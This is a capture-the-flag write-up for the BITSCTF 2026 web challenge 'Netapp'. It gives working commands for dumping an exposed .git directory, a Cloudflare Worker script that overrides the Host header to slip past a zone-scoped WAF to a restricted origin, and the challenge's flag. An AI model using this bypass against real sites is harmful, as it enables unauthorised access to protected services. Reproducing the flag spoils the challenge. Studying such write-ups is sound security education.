# Netapp — BITSCTF 2026 Web Challenge Writeup

**Challenge:** Netapp
**Category:** Web
**Points:** 498
**Description:** *"We think our internal services are protected because we use netapp 😘"*
**URL:** https://netapp.bitskrieg.in

---

## TL;DR

Exposed `.git` directory → leaked Terraform infrastructure code → discovered origin server IP (`3.208.18.209`) and a hidden Cloudflare-protected domain (`bitsctf-2026.hvijay.dev`) with a WAF rule blocking all traffic. Bypassed by registering our own domain on Cloudflare pointing to the same origin IP, then used a Cloudflare Worker to make an HTTPS request through our zone (avoiding the firewall) while overriding the `Host` header to `bitsctf-2026.hvijay.dev`, which caused the origin to serve the flag.

**Flag:** `BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`

---

## Step 1: Initial Reconnaissance

Visiting `https://netapp.bitskrieg.in` presents a clean status dashboard titled **"⚡ Netapp — Secure cloud services by Netapp"** showing three services:

| Service | Status |
|---------|--------|
| Web Portal | ONLINE |
| Auth Gateway | ONLINE |
| flag-service | INTERNAL |

At the bottom, an important note reads:

> *"All public endpoints are proxied through our edge network. Internal services are only accessible through our vpn."*

The page is entirely static HTML+CSS — no JavaScript, no forms, no links, no API calls. Standard path fuzzing (`/admin`, `/api`, `/login`, `/flag`, etc.) returns only `404`. The response headers confirm the site is behind **Cloudflare** (`server: cloudflare`, `cf-ray` header present).

---

## Step 2: Discovering the Exposed `.git` Directory

Testing for common sensitive file exposures:

```bash
curl -s https://netapp.bitskrieg.in/.git/HEAD
```

**Response:**
```
ref: refs/heads/main
```

The `.git` directory is publicly accessible! This is a critical information disclosure vulnerability that allows us to reconstruct the entire source repository.

---

## Step 3: Dumping the Git Repository

We can manually walk the git object graph or use automated tools like `git-dumper`. Here's the manual approach:

### 3.1 — Get the commit hash

```bash
curl -s https://netapp.bitskrieg.in/.git/refs/heads/main
# Output: 52f7105fa9fca1c69d50fbc0f6b8951a269d08a0
```

### 3.2 — Download the commit object

```bash
curl -s https://netapp.bitskrieg.in/.git/objects/52/f7105fa9fca1c69d50fbc0f6b8951a269d08a0 | python3 -c "
import sys, zlib
print(zlib.decompress(sys.stdin.buffer.read()).decode())
"
```

**Output:**
```
tree 961b4c35015f54a2b8f47490f1e3a680a1d1a529
author Krish <185198368+krxsh0x@users.noreply.github.com> 1771558619 +0530
committer Krish <185198368+krxsh0x@users.noreply.github.com> 1771558619 +0530

initial commit
```

This is the only commit (no `parent` line), authored by **Krish (krxsh0x)**.

### 3.3 — Walk the tree objects

Following the tree hash `961b4c35...` reveals the repository structure:

```
.
├── index.html                              (the static dashboard page)
└── flag-service/
    ├── aws-security-group.tf               (AWS infrastructure)
    └── bitsctf-2026-vpn-only.tf            (Cloudflare firewall config)
```

We download each blob by fetching its object from `.git/objects/<first-2-chars>/<remaining-hash>` and decompressing with zlib.

---

## Step 4: Analyzing the Leaked Terraform Files

This is where the challenge gets interesting. The leaked Terraform files reveal the entire infrastructure architecture.

### 4.1 — `aws-security-group.tf` — Origin Server Details

```hcl
# EC2 instance IP - 3.208.18.209

locals {
  cloudflare_ips = [
    "173.245.48.0/20",
    "103.21.244.0/22",
    "103.22.200.0/22",
    "103.31.4.0/22",
    "141.101.64.0/18",
    "108.162.192.0/18",
    "190.93.240.0/20",
    "188.114.96.0/20",
    "197.234.240.0/22",
    "198.41.128.0/17",
    "162.158.0.0/15",
    "104.16.0.0/13",
    "104.24.0.0/14",
    "172.64.0.0/13",
    "131.0.72.0/22"
  ]
}

resource "aws_security_group" "cf_only_web" {
  name        = "allow-cloudflare-only"
  description = "Allow HTTP/HTTPS only from Cloudflare"

  ingress {
    description = "HTTP from Cloudflare"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = local.cloudflare_ips
  }

  ingress {
    description = "HTTPS from Cloudflare"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = local.cloudflare_ips
  }
}
```

**Key takeaways:**
- The **origin server IP** is `3.208.18.209` (AWS EC2 instance in `us-east-1`)
- The **Security Group** only allows HTTP/HTTPS traffic from **Cloudflare's proxy IP ranges**
- Direct access to the origin from non-Cloudflare IPs is blocked

We confirm this with nmap:

```bash
nmap -Pn -p 22,80,443 3.208.18.209
```
```
PORT    STATE    SERVICE
22/tcp  open     ssh        # SSH is open (separate SG rule, not in the leaked TF)
80/tcp  filtered http       # Blocked by SG
443/tcp filtered https      # Blocked by SG
```

### 4.2 — `bitsctf-2026-vpn-only.tf` — Cloudflare Firewall Configuration

```hcl
data "cloudflare_zone" "example" {
  name = "hvijay.dev"
}

resource "cloudflare_filter" "vpn_access_filter" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Filter for allowing only VPN access to bitsctf-2026.hvijay.dev"
  body        = "(http.host eq \"bitsctf-2026.hvijay.dev\") and (ip.src ne 0.0.0.0)"
}

resource "cloudflare_firewall_rule" "vpn_access_rule" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Allow only VPN Access."
  action      = "block"
  priority    = 1
  filter      = cloudflare_filter.vpn_access_filter.id
}
```

**Key takeaways:**
- There is a **hidden domain**: `bitsctf-2026.hvijay.dev` on the Cloudflare zone `hvijay.dev`
- A **Cloudflare Firewall Rule** blocks ALL traffic to this domain
- The filter expression: `(http.host eq "bitsctf-2026.hvijay.dev") and (ip.src ne 0.0.0.0)` — blocks when the hostname matches AND the source IP is NOT `0.0.0.0`
- Since no real client ever has `ip.src = 0.0.0.0`, this effectively **blocks everyone**

We verify the domain exists and is blocked:

```bash
curl -sk https://bitsctf-2026.hvijay.dev/
# Returns: 403 - "Sorry, you have been blocked"
```

The `/cdn-cgi/trace` endpoint (which bypasses WAF rules since it's handled by Cloudflare's edge) confirms the domain is active:

```bash
curl -sk https://bitsctf-2026.hvijay.dev/cdn-cgi/trace
```
```
h=bitsctf-2026.hvijay.dev
ip=<our_ip>
warp=off
```

---

## Step 5: Understanding the Security Model

At this point we have a clear picture of the architecture:

```
                    ┌─────────────────────────────────────┐
                    │         Cloudflare Edge              │
                    │                                      │
  User ───────────►│  Zone: bitskrieg.in                  │
                    │    netapp.bitskrieg.in ──► 200 OK   │──── SG allows ────► EC2 3.208.18.209
                    │                                      │                    (nginx)
                    │  Zone: hvijay.dev                    │                    ├─ Host: netapp.bitskrieg.in → static page
  User ─────X──────│    bitsctf-2026.hvijay.dev           │                    ├─ Host: bitsctf-2026.hvijay.dev → FLAG
                    │    WAF: BLOCK if ip.src ≠ 0.0.0.0   │                    └─ default → nginx welcome
                    │                                      │
                    └─────────────────────────────────────┘
```

**The challenge:** We need to reach the origin server (`3.208.18.209`) with `Host: bitsctf-2026.hvijay.dev`, but:

1. **Direct access** to the origin is blocked — the AWS Security Group only allows Cloudflare proxy IPs
2. **Through Cloudflare** with `Host: bitsctf-2026.hvijay.dev` is blocked — the WAF firewall rule on the `hvijay.dev` zone blocks everything

We need our request to:
- Travel through Cloudflare's network (so the source IP is a Cloudflare proxy IP → passes the SG)
- Arrive at the origin with `Host: bitsctf-2026.hvijay.dev` (so nginx routes to the flag-service vhost)
- **NOT** pass through the `hvijay.dev` zone's firewall

---

## Step 6: Dead Ends (What Didn't Work)

Before arriving at the solution, we explored and ruled out multiple approaches:

### 6.1 — Cloudflare WARP VPN

The Terraform file is named `vpn-only`, suggesting a VPN-based bypass. We set up Cloudflare WARP using `wgcf`:

```bash
wgcf register --accept-tos
wgcf generate
sudo wg-quick up wgcf-profile
```

With WARP active, `/cdn-cgi/trace` showed `warp=on` and our `ip.src` changed to `104.28.217.121` (a Cloudflare WARP exit IP). However, this is still not `0.0.0.0`, so the firewall still blocked us with 403.

### 6.2 — Cloudflare Worker Direct Fetch

Deployed a Cloudflare Worker on `workers.dev` to fetch `bitsctf-2026.hvijay.dev` directly:

```javascript
fetch("https://bitsctf-2026.hvijay.dev/")
```

The Worker's `ip.src` was `2a06:98c0:3600::103` (a Cloudflare internal IPv6). Still not `0.0.0.0` → 403 blocked.

### 6.3 — Worker TCP Sockets to Origin

Used the Workers `connect()` API to make a raw TCP connection directly to the origin:

```javascript
import { connect } from "cloudflare:sockets";
const socket = connect("3.208.18.209:80");
```

Connection timed out — Worker egress IPs are NOT in the Cloudflare proxy ranges listed in the Security Group.

### 6.4 — Host Header Tricks

Attempted to bypass the WAF rule's string matching with:
- Trailing dot: `bitsctf-2026.hvijay.dev.`
- Uppercase: `BITSCTF-2026.HVIJAY.DEV`
- Port suffix: `bitsctf-2026.hvijay.dev:443`

All returned 403 — Cloudflare normalizes the `http.host` field before evaluating firewall rules.

### 6.5 — IP Spoofing Headers

Attempted to spoof `ip.src` via headers:
- `X-Forwarded-For: 0.0.0.0`
- `CF-Connecting-IP: 0.0.0.0`
- `True-Client-IP: 0.0.0.0`

All returned 403 — Cloudflare determines `ip.src` from the actual TCP connection, not from headers.

---

## Step 7: The Bypass — Cross-Zone Host Header Override

The key insight is that Cloudflare's WAF/firewall rules are **zone-specific**. The block rule exists only on the `hvijay.dev` zone. If we can route our request to the origin through a **different Cloudflare zone** (one we control, with no firewall rules), the `hvijay.dev` firewall never triggers.

### 7.1 — Set Up Our Own Cloudflare Zone

We need a domain on our own Cloudflare account. Any domain works — the critical requirement is that it's added to Cloudflare with an active DNS proxy.

1. **Add the domain** to our Cloudflare account (e.g., `attacker-domain.com`)
2. **Create an A record**: `proxy.attacker-domain.com` → `3.208.18.209` with **Proxy enabled** (orange cloud)
3. **Update nameservers** at the registrar to Cloudflare's assigned nameservers

Once DNS is configured, we verify that our domain reaches the origin through Cloudflare:

```bash
curl -s --resolve "proxy.attacker-domain.com:80:<cloudflare-ip>" \
     http://proxy.attacker-domain.com/
```

**Response:** The nginx default welcome page! This confirms:
- Our domain is proxied through Cloudflare ✓
- Cloudflare connects to `3.208.18.209` using its proxy IPs ✓
- The Security Group allows the connection ✓
- The origin serves the default nginx vhost (because `Host: proxy.attacker-domain.com` doesn't match any configured server block)

### 7.2 — Override the Host Header via Cloudflare Worker

The origin's nginx uses virtual hosting. It serves the flag only when it receives `Host: bitsctf-2026.hvijay.dev`. We need to change the Host header that reaches the origin.

Since **Origin Rules** (Host Header Override) requires a paid Cloudflare plan, we use a **Cloudflare Worker** instead. The Worker makes an HTTPS `fetch()` to our proxied domain but overrides the `Host` header:

```javascript
export default {
  async fetch(request) {
    const resp = await fetch("https://proxy.attacker-domain.com/", {
      headers: {
        "Host": "bitsctf-2026.hvijay.dev",
        "User-Agent": "Mozilla/5.0"
      }
    });
    return resp;
  },
};
```

Deploy the Worker:

```bash
npx wrangler deploy
```

### 7.3 — Get the Flag

```bash
curl -s https://our-worker.workers.dev/
```

**Response:**
```
BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}
```

---

## Step 8: Why This Works

The request flow that bypasses all protections:

```
1. Our Worker (on workers.dev) makes fetch("https://proxy.attacker-domain.com/")
   with Host: bitsctf-2026.hvijay.dev

2. Cloudflare routes the request based on the URL hostname:
   → proxy.attacker-domain.com is in OUR Cloudflare zone
   → OUR zone has NO firewall rules → request passes through

3. Cloudflare's CDN connects to the origin (3.208.18.209) using
   Cloudflare proxy IPs → AWS Security Group ALLOWS the connection

4. The HTTPS request arrives at the origin with the overridden
   Host header: bitsctf-2026.hvijay.dev

5. Nginx on the origin matches the server_name bitsctf-2026.hvijay.dev
   → serves the flag-service → returns the flag
```

**Critical detail:** For HTTPS `fetch()` in Cloudflare Workers, the custom `Host` header is honored and forwarded to the origin. This is because HTTPS requires the Host/SNI to match for proper TLS handling, and the Worker runtime passes through the explicitly set `Host` header. For HTTP requests, Cloudflare overrides the Host header with the URL's hostname — which is why only the HTTPS variant works.

The bypass exploits a fundamental architectural weakness:

- **Cloudflare's WAF is zone-scoped**: firewall rules on `hvijay.dev` cannot block requests that travel through a different zone
- **The origin trusts any Cloudflare IP**: the Security Group doesn't distinguish between Cloudflare zones — any Cloudflare proxy IP is allowed
- **Virtual hosting relies solely on the Host header**: the origin has no additional authentication to verify which Cloudflare zone forwarded the request

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Visit `netapp.bitskrieg.in` | Static dashboard showing `flag-service` as INTERNAL |
| 2 | Probe `/.git/HEAD` | Exposed git repository discovered |
| 3 | Dump git objects | Retrieved Terraform infrastructure files |
| 4 | Analyze `aws-security-group.tf` | Origin IP: `3.208.18.209`, SG allows only Cloudflare IPs |
| 5 | Analyze `bitsctf-2026-vpn-only.tf` | Hidden domain `bitsctf-2026.hvijay.dev` with WAF blocking all traffic |
| 6 | Register our domain on Cloudflare | A record → `3.208.18.209` with proxy enabled |
| 7 | Deploy Cloudflare Worker | HTTPS fetch to our domain with `Host: bitsctf-2026.hvijay.dev` |
| 8 | Access the Worker | **`BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`** |

---

## Flag

```
BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}
```

*"even AI is bad at configuration"* — a fitting commentary on the misconfigured trust boundaries between Cloudflare zones and origin servers.
